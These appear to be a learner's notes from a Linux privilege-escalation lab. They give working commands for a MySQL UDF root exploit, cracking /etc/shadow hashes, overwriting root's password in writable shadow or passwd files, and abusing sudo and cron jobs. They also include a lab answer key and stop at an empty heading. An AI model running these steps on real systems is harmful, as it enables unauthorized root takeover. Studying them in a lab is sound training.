# Linux PrivEsc


## Service Exploits
- MySQL is running as root, and the root user for the service doesn't have a apassword assigned
- [This exploit](https://www.exploit-db.com/exploits/1518) takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service
```
Change into the /home/user/tools/mysql-udf directory:

cd /home/user/tools/mysql-udf

Compile the raptor_udf2.c exploit code using the following commands:

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Connect to the MySQL service as the root user with a blank password:

mysql -u root

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p

Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!

rm /tmp/rootbash
exit
```

## Weak File Permissions - Readable /etc/shadow
- `/etc/shadow` contains user password hashes and is usually only readable by root user
1. `ls -al /etc/shadow`
2. `cat /etc/shadow`
3. Copy the hash to a file and `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` or `hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt`
- Exercise
    1. `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`
    2. `sha512crypt`
    3. `password123`

## Weak File Permissions - Writable /etc/shadow
1. `ls -al /etc/shadow`
2. `mkpasswd -m sha-512 newpasswordhere`
3. Replace the root hash in `/etc/shadow` with the one generated

## Weak File Permissions - Writable /etc/passwd
- `/etc/passwd` contains information about user accounts
- Usually word-readable, but only writable by root
- Used to contain password hashes, but now they're stored in `/etc/shadow`
1. `ls -al /etc/passwd`
2. `openssl passwd <new password>`
3. Edit the `/etc/passwd` file and place the generated password hash between the first and second colon of the root user's row (replacing the x)
    - Or just create a new user on the file by adding a new line with the username, password hash, and other details

## Sudo - Shell Escape Sequences
- List the programs which sudo allows your user to run with `sudo -l`
- Visit [GTFOBins](https://gtfobins.github.io/) and search for the programs that you're allowed to run

## Sudo - Environment Variables
- Sudo can be configured to inherit certain environment variables from the user's environment
- Check which environment variables are inherited with `sudo -l`

## Cron Jobs - File Permissions
- Cron jobs are programs or scripts which can be scheduled to run at specific times
- View contents of crontab `cat /etc/crontab`
- If you have write access to a script that is scheduled to run, you can edit it and insert a reverse shell

## Cron Jobs - PATH Environment Variable
- If the absolute path of the program that is scheduled to run isn't used, then you can easily create a program of the same name, edit the PATH variable to include the file you created, and wait for the cron job to run your script

## Cron Jobs - Wildcards
